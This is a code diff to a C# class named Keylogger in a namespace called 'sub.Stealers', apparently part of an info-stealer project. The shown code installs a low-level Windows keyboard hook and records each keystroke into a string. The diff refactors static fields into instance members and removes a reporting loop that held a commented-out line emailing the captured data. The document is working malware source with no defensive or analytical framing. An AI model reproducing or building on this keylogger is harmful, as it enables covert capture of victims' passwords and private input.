@@ -12,8 +12,8 @@ namespace sub.Stealers
 
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
-        private static LowLevelKeyboardProc _proc = HookCallback;
-        private static IntPtr _hookID = IntPtr.Zero;
+        private LowLevelKeyboardProc _proc;
+        private IntPtr _hookID = IntPtr.Zero;
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook,
@@ -34,7 +34,7 @@ namespace sub.Stealers
 
         #region Keyboard Hooks
 
-        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        private IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
             using (ProcessModule curModule = curProcess.MainModule)
@@ -47,7 +47,7 @@ namespace sub.Stealers
         private delegate IntPtr LowLevelKeyboardProc(
             int nCode, IntPtr wParam, IntPtr lParam);
 
-        private static IntPtr HookCallback(
+        private IntPtr HookCallback(
             int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
@@ -59,7 +59,12 @@ namespace sub.Stealers
 
         #endregion
 
-        private static string _data = "";
+        public string Data { get; set; }
+
+        public Keylogger()
+        {
+            _proc = HookCallback;
+        }
 
         public void Collect()
         {
@@ -68,25 +73,15 @@ namespace sub.Stealers
             UnhookWindowsHookEx(_hookID);
         }
 
-        public void ReportData(object delay)
-        {
-            while (true)
-            {
-                Thread.Sleep((int) delay);
-                MessageBox.Show(_data);
-                //new ReportEmail(username, password, host, port).Send(_data);
-            }
-        }
-
-        private static void ProcessChar(int code)
+        private void ProcessChar(int code)
         {
             switch (code)
             {
                 case 32:
-                    _data += "[Space]";
+                    Data += "[Space]";
                     break;
                 default:
-                    _data += (Keys) code;
+                    Data += (Keys) code;
                     break;
             }
         }
